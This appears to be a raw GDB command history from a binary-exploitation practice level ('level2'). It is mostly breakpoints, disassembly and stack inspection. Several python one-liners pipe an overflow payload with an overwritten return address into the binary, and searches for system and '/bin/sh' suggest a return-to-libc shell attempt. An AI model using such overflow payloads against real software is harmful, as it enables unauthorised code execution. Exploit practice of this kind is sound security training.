c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
r
c
r
c
r
c
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB
c
r
c
r
c
r
c 
r
c
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBBBB
c
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBBBB
c
c
r
c
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBBBB
c
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaBBBB
c
r
c
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBB
r
c
disass p
r
disass p
b *p + 36
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
s
c
p $eax
s
p $eax
s
p $eax
set $eax = 0x08048500
p $eax
set $eax = 0x804854a
s
s
s
r
disass p
b *p + 44
r
s
disass p
b *p +44
r
p $eax
set $eax = 1342177279
s
s
s
s
s
s
s
s
s
s
r
checksec
r
b main
r
info frame
b main
b p
r
c
disass p
c
r
c
c
r
c
c
r
c
c
r
c
r
c
c
r
c
c
r
c
c
r
c
disass p
b *0x0804853d
c
info frame
x/24s
b p
r
disass p
b *0x0804853d
r
c
x/10x $rsp
x/10s $rsp
x/s $rsp
disass p
b *0x0804853e
c
r
x/10x $rsp
disass p
b *0x0804852d
b *0x0804853d
r
x/10x $esp
x/96x $esp
disass main
set disassembly-flavor intel
b *main +11
r
info frame
x/24x $esp
x/24wx $esp
x/96wx $esp
x/200wx $esp
x/2000wx $esp
r
x/24wx $esp
disass p
b *0x08048500
r
x/24wx $esp
c
r
r
c
r
c
r
c
c
disass p[
disass p
b *0x080484f2
r
p $eax
x/24wx $esp
x/64wx $esp
p $ebp
p $ebp+0x4
r
c
r
c
disass p
r
c
python -c "print('A' * 41 + \"\x16\x85\x04\x08\" + 'A' * 31)" | ./level2
r
c
python -c "print('A' * 42 + \"\x16\x85\x04\x08\" + 'A' * 33 + \"\xff\xff\xff\x4f\")" | ./level2
python -c "print 'A' * 42 + \"\x16\x85\x04\x08\" + 'A' * 33 + \"\xff\xff\xff\x4f\"" | ./level2
python -c "print 'A' * 42 + \"\x16\x85\x04\x08\" + 'A' * 33 + \"\xff\xff\xff\x4f\"" > /tmp/input.txt
python -c "print('A' * 42 + \"\x16\x85\x04\x08\" + 'A' * 33 + \"\xff\xff\xff\x4f\")" | ./level2
disass p
b main
p exit
r
p exit
p system
info proc map
x/s F7F2D0F5
x/s 0xf7f2d0f5
find "/bin/sh"
disasss p
disass p
find "/bin/sh"
disass main
disass p
b main
r
p exit
p system
find "/bin/sh"
info proc map
disass main
disass p
find strdup
find "strdup"
find "/bin/sh"
b main
r
find "strdup"
